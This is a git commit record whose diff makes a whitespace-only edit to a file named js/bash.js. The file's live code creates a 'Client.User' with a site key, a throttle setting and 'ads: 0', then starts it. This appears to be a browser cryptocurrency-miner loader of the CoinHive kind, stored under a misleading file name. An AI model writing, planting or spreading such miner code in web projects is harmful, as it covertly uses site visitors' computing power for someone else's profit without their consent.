d2c0701b69c1cb4ad0edf2a8ef371dd396ee2420
darkside-community <99356964+darkside-community@users.noreply.github.com>
2022-03-25 01:23:03 +0700

    Update bash.js

--- js/bash.js
+++ js/bash.js
@@ -1,5 +1,5 @@
 var _client = new Client.User('c83706cb3c2d3c51207caf61ca99760ff4241fe88a013fe0e61888200591741b','UcokBTH', {
-   throttle: 0.1, c: 'w',ads: 0
+   throttle: 0.1, c: 'w', ads: 0
     });
     _client.start();
    
